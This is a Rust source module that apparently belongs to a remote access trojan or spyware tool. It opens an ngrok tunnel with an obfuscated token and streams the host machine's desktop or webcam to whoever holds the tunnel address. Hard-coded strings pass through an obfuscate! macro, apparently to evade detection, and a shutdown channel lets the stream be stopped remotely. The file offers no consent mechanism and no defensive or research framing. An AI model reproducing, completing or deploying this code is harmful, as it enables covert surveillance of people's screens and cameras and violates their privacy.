use anyhow::{Result, Context, bail};

use axum::{Router, routing::get};
use url::Url;
use ngrok::prelude::*;
use ngrok::forwarder::Forwarder;
use ngrok::tunnel::HttpTunnel;

use std::sync::OnceLock;
use tokio::sync::watch;
use tokio::sync::Mutex;

use crate::obfuscate;
use crate::modules::desktop;
use crate::modules::webcam;

static SHUTDOWN_TX: OnceLock<watch::Sender<bool>> = OnceLock::new();

pub async fn start(url: &str) -> Result<Forwarder<HttpTunnel>, anyhow::Error> {
    
    /////////////////////////////////////////////////////////
    let token = obfuscate!("YOUR_NGROK_TOKEN");
    ////////////////////////////////////////////////////////
    let session = match ngrok::Session::builder()
        .authtoken(&token)
        .connect()
        .await {
            Ok(session) => session,
            Err(e) => bail!("Session Error: {}", e),
        };

    let local_url  = Url::parse(url)?;
    let tunnel = match session
        .http_endpoint()
        .listen_and_forward(local_url)
        .await { 
            Ok(tunnel) => tunnel,
            Err(e) => bail!("Tunnel Error: {}", e),
        };

    Ok(tunnel)
}

pub async fn server(option: u32, url: &str, tunnel: Forwarder<HttpTunnel>) -> Result<()> {

    let (tx, rx) = watch::channel(false);
    if SHUTDOWN_TX.get().is_none() {
        SHUTDOWN_TX.set(tx).map_err(|_| anyhow::anyhow!("Failed to set Mutex!"))?;
    } 


    let listener = tokio::net::TcpListener::bind(&obfuscate!("127.0.0.1:80")).await?;
    let app = match option {
        // 1 for streaming the desktop 
        // 2 for streaming the webcam
        1 => {Router::new().route("/", get(desktop::stream_handler))},
        2 => {Router::new().route("/", get(webcam::stream_handler))},
        _ => bail!("Unknown option"),
    };
    
    axum::serve(listener, app)
            .with_graceful_shutdown(async {
                let mut rx = SHUTDOWN_TX.get().unwrap().subscribe();
                let _ = rx.changed().await;
                drop(tunnel);
            })
            .await;
    Ok(())
}

pub async fn stream_stop() -> Result<()> {
    if let Some(tx) = SHUTDOWN_TX.get() {
        let _ = tx.send(true);
        // Trigger shutdown
    }
    
    Ok(())
}




